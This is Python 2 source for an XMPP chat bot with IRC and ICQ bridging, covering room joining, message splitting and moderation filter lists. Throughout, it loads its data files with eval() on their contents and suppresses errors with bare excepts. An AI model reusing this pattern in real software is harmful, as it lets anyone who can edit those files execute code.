GBANDO_FILE = 'data/GBadServ.py'
db_file(GBANDO_FILE, dict)
try:
    GBANDO = eval(read_file(GBANDO_FILE))
except:
    pass	
######################################################
######################################################
BANJID = {}
BANJID_FILEX = 'data/BadJid.py'
db_file(BANJID_FILEX, dict)
try:
    BANJID = eval(read_file(BANJID_FILEX))
except: pass
GBANJID = {}
GBANJID_FILEX = 'data/GBadJid.py'
db_file(GBANJID_FILEX, dict)
try:
    GBANJID = eval(read_file(GBANJID_FILEX))
except: pass
######################################################
######################################################
BANST = {}
STATUSBAD = 'data/BadSt.py'
db_file(STATUSBAD, dict)
try:
    BANST = eval(read_file(STATUSBAD))
except: pass
GBANST = {}
GSTATUSBAD = 'data/GBadSt.py'
db_file(GSTATUSBAD, dict)
try:
    GBANST = eval(read_file(GSTATUSBAD))
except: pass
######################################################
######################################################
smart = {}
smart_FILE = 'data/BadMsg.py'
db_file(smart_FILE, dict)
try:
    smart = eval(read_file(smart_FILE))
except: pass
Gsmart = {}
Gsmart_FILE = 'data/GBadMsg.py'
db_file(Gsmart_FILE, dict)
try:
    Gsmart = eval(read_file(Gsmart_FILE))
except: pass
######################################################
######################################################
BADNICK = {}
BADNICK_FILE = 'data/BadNick.py'
db_file(BADNICK_FILE, dict)
try:
    BADNICK = eval(read_file(BADNICK_FILE))
except: pass
GBADNICK = {}
GBADNICK_FILE = 'data/GBadNick.py'
db_file(GBADNICK_FILE, dict)
try:
    GBADNICK = eval(read_file(GBADNICK_FILE))
except: pass
######################################################
######################################################
msgx = {}
msgx_FILE = 'data/MsgSy.py'
db_file(msgx_FILE, dict)
try:
    msgx = eval(read_file(msgx_FILE))
except: pass
Gmsgx = {}
Gmsgx_FILE = 'data/GMsgSy.py'
db_file(Gmsgx_FILE, dict)
try:
    Gmsgx = eval(read_file(Gmsgx_FILE))
except: pass
######################################################
######################################################
BADall = {}
BADall_FILE = 'data/BADall.py'
db_file(BADall_FILE, dict)
try:
    BADall = eval(read_file(BADall_FILE))
except: pass
GBADall = {}
GBADall_FILE = 'data/GBADall.py'
db_file(GBADall_FILE, dict)
try:
    GBADall = eval(read_file(GBADall_FILE))
except: pass
######################################################
######################################################						
						
CHMSG = {}
CHMSG_FILE = 'data/CHmsg.py'
db_file(CHMSG_FILE, dict)

try:
    CHMSG = eval(read_file(CHMSG_FILE))
except:
    pass
CHMSG1 = {}
CHMSG1_FILE = 'data/CHM.py'
db_file(CHMSG1_FILE, dict)

try:
    CHMSG1 = eval(read_file(CHMSG1_FILE))
except:
    pass
######################################################
######################################################
CHSTATUS = {}
CHSTATUS_FILE = 'data/CHstatus.py'
db_file(CHSTATUS_FILE, dict)

try:
    CHSTATUS = eval(read_file(CHSTATUS_FILE))
except:
    pass
CHSTATUS1 = {}
CHSTATUS1_FILE = 'data/CHS1.py'
db_file(CHSTATUS1_FILE, dict)

try:
    CHSTATUS1 = eval(read_file(CHSTATUS1_FILE))
except:
    pass
######################################################
######################################################
CHNICK = {}
CHNICK_FILE = 'data/CHnick.py'
db_file(CHNICK_FILE, dict)

try:
    CHNICK = eval(read_file(CHNICK_FILE))
except:
    pass
CHNICK1 = {}
CHNICK1_FILE = 'data/CHN1.py'
db_file(CHNICK1_FILE, dict)

try:
    CHNICK1 = eval(read_file(CHNICK1_FILE))
except:
    pass
######################################################
######################################################
MUC_MSG9 = {}

MUC_MSG9_FILE = 'data/newrep.py'
db_file(MUC_MSG9_FILE, dict)

try:
    MUC_MSG9 = eval(read_file(MUC_MSG9_FILE))
except:
    pass
######################################################
######################################################
xxx3 = {}

xxx3_FILE = 'data/OFF1.py'
db_file(xxx3_FILE, dict)

try:
    xxx3 = eval(read_file(xxx3_FILE))
except:
    pass
######################################################
######################################################
MUC_nickss = {}

MUC_nickss_FILE = 'data/nick5.py'
db_file(MUC_nickss_FILE, dict)

try:
    MUC_nickss = eval(read_file(MUC_nickss_FILE))
except:
    pass
######################################################
######################################################
White = {}
VERSHOW_LIMIT = {}

White_FILE = 'data/White.py'
db_file(White_FILE, dict)

try:
    White = eval(read_file(White_FILE))
except:
    pass
######################################################
######################################################	
Black1 = {}
VERSHOW1_LIMIT = {}

Black1_FILE = 'data/Black.py'
db_file(Black1_FILE, dict)

try:
    Black1 = eval(read_file(Black1_FILE))
except:
    pass	
######################################################
######################################################
VERSHOWR = {}
VERSHOW_LIMIT = {}

VERSHOWR_FILE = 'data/Vershow.py'
db_file(VERSHOWR_FILE, dict)

try:
    VERSHOWR = eval(read_file(VERSHOWR_FILE))
except:
    pass
######################################################
######################################################	

MUC_FCON = {}

MUC_FCONX_FILE = 'data/len.py'
db_file(MUC_FCONX_FILE, dict)

try:
    MUC_FCON = eval(read_file(MUC_FCONX_FILE))
except:
    pass	
######################################################
######################################################

MUC_FCON8 = {}

MUC_FCONX8_FILE = 'data/Flood.py'
db_file(MUC_FCONX8_FILE, dict)

try:
    MUC_FCON8 = eval(read_file(MUC_FCONX8_FILE))
except:
    pass	
######################################################
######################################################
MUC_MSG = {}

MUC_MSG_FILE = 'data/msg2.py'
db_file(MUC_MSG_FILE, dict)

try:
    MUC_MSG = eval(read_file(MUC_MSG_FILE))
except:
    pass	
######################################################
######################################################
MUC_adb = {}

MUC_adb_FILE = 'data/adb.py'
db_file(MUC_adb_FILE, dict)

try:
    MUC_adb = eval(read_file(MUC_adb_FILE))
except:
    pass	
######################################################
######################################################
MUC_rep = {}

MUC_rep_FILE = 'data/rep.py'
db_file(MUC_rep_FILE, dict)

try:
    MUC_rep = eval(read_file(MUC_rep_FILE))
except:
    pass	
######################################################
######################################################
MUC_answer = {}

MUC_answer_FILE = 'data/answer.py'
db_file(MUC_answer_FILE, dict)

try:
    MUC_answer = eval(read_file(MUC_answer_FILE))
except:
    pass	
######################################################
######################################################
MUC_speed = {}

MUC_speed_FILE = 'data/speed.py'
db_file(MUC_speed_FILE, dict)

try:
    MUC_speed = eval(read_file(MUC_speed_FILE))
except:
    pass	
######################################################
######################################################
MUC_nick = {}

MUC_nick_FILE = 'data/nick6.py'
db_file(MUC_nick_FILE, dict)

try:
    MUC_nick = eval(read_file(MUC_nick_FILE))
except:
    pass	
######################################################
######################################################
MUC_res = {}

MUC_res_FILE = 'data/res.py'
db_file(MUC_res_FILE, dict)

try:
    MUC_res = eval(read_file(MUC_res_FILE))
except:
    pass		
######################################################
######################################################
MUC_status = {}

MUC_status_FILE = 'data/status2.py'
db_file(MUC_status_FILE, dict)

try:
    MUC_status = eval(read_file(MUC_status_FILE))
except:
    pass	
######################################################
######################################################
MUC_statusz = {}

MUC_statusz_FILE = 'data/status3.py'
db_file(MUC_statusz_FILE, dict)

try:
    MUC_statusz = eval(read_file(MUC_statusz_FILE))
except:
    pass
######################################################
######################################################
MUC_nickzz = {}

MUC_nickzz_FILE = 'data/nick4.py'
db_file(MUC_nickzz_FILE, dict)

try:
    MUC_nickzz = eval(read_file(MUC_nickzz_FILE))
except:
    pass
######################################################
######################################################
MUC_statusr = {}

MUC_statusr_FILE = 'data/status4.py'
db_file(MUC_statusr_FILE, dict)

try:
    MUC_statusr = eval(read_file(MUC_statusr_FILE))
except:
    pass	
######################################################
######################################################
MUC_nickz = {}

MUC_nickz_FILE = 'data/nick3.py'
db_file(MUC_nickz_FILE, dict)

try:
    MUC_nickz = eval(read_file(MUC_nickz_FILE))
except:
    pass	
######################################################
######################################################
MUC_nickr = {}

MUC_nickr_FILE = 'data/nick2.py'
db_file(MUC_nickr_FILE, dict)

try:
    MUC_nickr = eval(read_file(MUC_nickr_FILE))
except:
    pass		
######################################################
######################################################
FAST_JOIN = {}

FAST_JOIN_FILE = 'data/Fast_join.py'
db_file(FAST_JOIN_FILE, dict)

try:
    FAST_JOIN = eval(read_file(FAST_JOIN_FILE))
except:
    pass	
######################################################
######################################################
NONE_MSGXX = {}

NONE_MSGXX_FILE = 'data/None_msg.py'
db_file(NONE_MSGXX_FILE, dict)

try:
    NONE_MSGXX = eval(read_file(NONE_MSGXX_FILE))
except:
    pass	
######################################################
######################################################
SPACE_MSGX = {}

SPACE_MSGX_FILE = 'data/Space.py'
db_file(SPACE_MSGX_FILE, dict)

try:
    SPACE_MSGX = eval(read_file(SPACE_MSGX_FILE))
except:
    pass
######################################################
######################################################

MUC_SPAM2 = {}

MUC_SPAM2_FILE = 'data/spam2.py'
db_file(MUC_SPAM2_FILE, dict)

try:
    MUC_SPAM2 = eval(read_file(MUC_SPAM2_FILE))
except:
    pass
######################################################
######################################################	
ACCBYCONFFILE = {}
ACCBYCONF_FILE = 'data/acc.py'
db_file(ACCBYCONF_FILE, dict)

try:
    ACCBYCONFFILE = eval(read_file(ACCBYCONF_FILE))
except:
    pass
###	
GLOBACCESS = {}	
GLOBACCESS_FILE = 'rooms-data/master.py'	
db_file(GLOBACCESS_FILE, dict)
try:	
    GLOBACCESS = eval(read_file(GLOBACCESS_FILE))
except:
    pass
######################################################
######################################################
from os import path						 
 
def join(groupchat, nick, cljid):
        if path.getsize(NAWRS1_FILE) >= (OS_MaxSize*1000):			
         Print(""" 
         OS_Filter """, color6)	
         Print("""
         Large file size has been deleted\n""", color3)
         NAWRS1={}	
         write_file(NAWRS1_FILE, str(NAWRS1)) 
         to_admin("\n تم تصفير ملف فحص نسخ الزائرين لزيادة حجم الملف\n")	
        if not isinstance(groupchat, unicode):
                groupchat = groupchat.decode('utf-8','replace')
        BOT_NICK[groupchat] = nick
        if not GROUPCHATS.has_key(groupchat):
                GROUPCHATS[groupchat] = {}
        db, status, show = {}, statusz, 'chat'
        try: db=eval(read_file('rooms-data/chatroom.py'))
     #   except: pass
      #  try: 		
                #iii = 'rooms-data/'+groupchat+'/Details.py'
                #size = path.getsize(iii)			
                #if size >= (MaxSize*1000):
                      #  write_file(iii, '{}', 0)				
                    #    Print( """
                  #      *[%s]* / Details"""%(groupchat)	, color6)
                     #   Print("""
                    #    Large file size has been deleted\n""", color3)
                     #   to_admin("تم تصفير ملف التفاصيل الخاص بروم \n"+(groupchat)+"\n وذلك لزيادة حجم الملف")						
        except: pass           
        if cljid in db.keys() and groupchat in db[cljid].keys():
                status=statusz
                show= 'chat'
        p = domish.Element(('jabber:client', 'presence'))
        p['to'] = u'%s/%s' % (groupchat, nick)
        try:
                p.addElement('status').addContent(status)
                p.addElement('show').addContent('chat')
        except: pass
        p.addElement('x', 'http://jabber.org/protocol/muc').addElement('history').__setitem__('maxchars', '0')
        c4Ele1m = domish.Element(('http://jabber.org/protocol/caps', 'c'))
        c4Ele1m['node'] = 'http://jabbe=STRONG Bot'
        p.addChild(c4Ele1m) 		
        reactor.callFromThread(dd, p, CLIENTS[cljid])
        
def leave(groupchat, reason, cljid):
        p = domish.Element(('jabber:client', 'presence'))
        p['to'] = u'%s' % (groupchat)
        p['type'] = 'unavailable'
        p.addElement('status').addContent(reason)
        reactor.callFromThread(dd, p, CLIENTS[cljid])

def section(body, lenn, sys=0, mode=0):
        rep=''
        k=' '
        if not body.count(' '):
                return body[:lenn]
        s=body.split(' ')
        if sys:
                if body.count('.'):
                        s=body.split('.')
                        k='.'
                if body.count('\n'):
                        s=body.split('\n')
                        k='\n'
        for x in s:
                if len(rep+k+x)<lenn:
                        rep+=k+x
                else:
                        break
        return rep
        
pyk = None

def notice(nick, body):
        list = ts(420, body)
        for x in list:
                if hasattr(IRC, 'notice'):
                        IRC.notice(nick, x)


def ts(l, body):
        g = []
        s = ' '
        list = body.split(' ')
        if len(body)>1000 and body.count('. ')>10:
                list = body.split('. ')
                s = '. '
        temp = ''
        for x in list:
                x=x+s
                if len(temp+x)>l:
                        g.append(temp)
                        temp = ''
                temp+=x
        g.append(temp)
        g = [x[:l] for x in g]
        return g

LAST_REPLY = {}

def reply(type, source, body):
 try:
        global LAST_REPLY
        try:
                if len(LAST_REPLY)>21:
                        LAST_REPLY.clear()
                a = get_true_jid(source)
                if a in LAST_REPLY.keys() and body and LAST_REPLY[a]['b']==body:
                        if time.time()-LAST_REPLY[a]['t']<1.1:
                                LAST_REPLY[a]['n']+=1
                                if LAST_REPLY[a]['n']>=20: return
                        else:
                                LAST_REPLY[a]['n']=0
                else:
                        LAST_REPLY[a]={'t':time.time(),'n':1, 'b':body}
        except: pass
        INFMELODY['out']+=1
        body2 = ''
        blen = len(body)
        if type=='private':
                type='chat'
        if type=='public':
                type='groupchat'
        if not isinstance(body, unicode):
                body=body.decode('utf-8','replace')
        if blen>5000:
                list = ts(5000, body)
                body = list[0]
                body2 = (list[1] if len(list)>1 else str())
                if len(list)>2:
                        body2 += ' 10000 of ['+str(blen)+']'
        for x in body:
                try:
                        if ord(x)<32 and ord(x) not in [9, 10, 13]:
                                body=body.replace(x, str(ord(x)))
                except: pass

        if type == 'irc' or source[1]==IRC_NICK or source[1] in melody_CHAN:
                if len(body)>1200:
                        body=ts(1200, body)[0]
                body = body.replace('\n', '    ')
                old_b = body
                global IRC
                #print source
                if not hasattr(IRC, 'msg'): return
                if isinstance(body, unicode):
                        try:
                                body = body.encode('utf-8','replace')
                        except: return

                nick = source[0].split('!')[0]
                if 'MAFIA' in globals().keys() and source[0] in MAFIA.keys():
                        notice(nick, body)
                        return
                if source[1] != IRC_NICK:
                        if len(body)>250:
                                list = ts(420, body)
                                for x in list:
                                        IRC.notice(nick, x)
                        else:
                                IRC.msg(source[1], nick+': '+body)
                else:
                        IRC.msg(nick, body)
                return

        if source[0].isdigit():
                time.sleep(1.5)
                reactor.callFromThread(icqsxt, source[0], body)
        else:
                try:
                        jids=get_true_jid(source)
                        if jids.count('mrim.'):
                                time.sleep(1.5)
                except: pass
                message = domish.Element(('jabber:client','message'))
                message["type"] = type
                if type in ['groupchat','tochat']:
                                cnt=0				
                                msg_limit=896
                                maxcnt = int(len(body)/msg_limit) + 1
                                mmsg = body
								
                                while len(mmsg) > msg_limit:
                                 tmsg = u' %s…' % (mmsg[:msg_limit])
                                 cnt += 1
                                 msg(source[3], source[1], tmsg)
                                 mmsg = mmsg[msg_limit:]
                                 time.sleep(3)
                                tmsg = '%s' % (mmsg)							
                              							
                                msg(source[3], source[1], tmsg)

                else:
                                cnt=0				
                                msg_limit=896
                                maxcnt = int(len(body)/msg_limit) + 1
                                mmsg = body
								
                                while len(mmsg) > msg_limit:
                                 tmsg = u' %s…' % (mmsg[:msg_limit])
                                 cnt += 1
                                 msg(source[3], source[1]+'/'+source[2], tmsg)
                                 mmsg = mmsg[msg_limit:]
                                 time.sleep(3)
                                tmsg = '%s' % (mmsg)							
                              							
                                msg(source[3], source[1]+'/'+source[2], tmsg)
                reactor.callFromThread(dd, message, CLIENTS[source[3]])
        if isinstance(body, unicode):
                call_outgoing_message_handlers(get_true_jid(source), body, body)
        if body2 and not body2.isspace() and isinstance(body2, basestring):
                threading.Thread(None,reply,'reply_part_2'+str(INFMELODY['thr']),(('private' if type in ['public','groupchat'] else type),source,body2)).start()
 except: pass

 
TO_ROOM = {}
def to_room(body):
 global TO_ROOM
 global CLIENTS
 for x in [x for x in GROUPCHATS.keys()]:
  if x in xxx3:
   pass
  else:
   i=random.choice(CLIENTS.keys())
   msg(i, x, body)  						
def msg(cljid, jid, body):
        INFMELODY['out']+=1
        type = 'chat'
        if jid in GROUPCHATS:
                type = 'groupchat'
        if jid.isdigit():
                try:
                        reactor.callFromThread(icqsxt, jid, body)
                except: print 'Exception in msg'
        else:
                message = domish.Element(('jabber:client','message'))
                message["type"] = type
                message["to"] = jid
                message.addElement("body", "jabber:client", body)
                reactor.callFromThread(dd, message, CLIENTS[cljid])
        call_outgoing_message_handlers(jid, body, body)

def icqsxt(to, body):
        try: INFMELODY['tout'] += sys.getsizeof(body)
        except: pass
        global ICQ
        if hasattr(ICQ, 'sendMessage'):
                ICQ.sendMessage(to, [(body.encode('windows-1251','ignore'),"windows-1251")])
        
        
def dd(x, cl='', tim=0):
 if not cl: return
 if tim:
  time.sleep(tim)
 try: INFMELODY['tout'] += sys.getsizeof(x)
 except: pass
 if not hasattr(cl, 'send'):
  pass
 else:
  try: cl.send(x)
  except: print '- Enable send Xml\n'
def stage0(cljid):
 global INFMELODY
 for process in STAGE0_INIT:
  INFMELODY['thr'] += 1
  try: threading.Thread(None,process,'stage0_init'+str(INFMELODY['thr']),(cljid,)).start()
  except: pass

  
  

join_rooms={'test':0}
def load_rooms(cljid):
 join(romms, BoTNicK, cljid)
 if join_rooms['test']==0: 
  Print("StRoNg BoT [2022] \n Loading every thing and will start now \n filters is loaded \n commands is loaded \n the boss is loaded \n rooms is loaded\n started successfully \n StRoNg BoT [ 2022] powered by \n darsh & Al VaEroS \n  I'm join to: "+Room+"\n i'm ok !", color_green)
  join_rooms['test']+=1  
 f = 'rooms-data/chatroom.py'
 db = eval(read_file(f))
 if not cljid in db.keys() or not cljid in CLIENTS.keys():
  return
 for x in db[cljid]:
  join(x, DEFAULT_NICK, cljid)
def load_accox():      
 for x in range(1000):
  istr = str(x)
  a, b = GENERAL_CONFIG("Bot_jid"+istr), GENERAL_CONFIG("Bot_pass"+istr)
  if a and b:
   if a in CLIENTS.keys():
    continue
   reactor.callFromThread(MelodX, b, a)
        
 MelodX(Bot_pass,Bot_jid)
melody_CHAN = {}


def starts():   		
  load_accox()
	            	
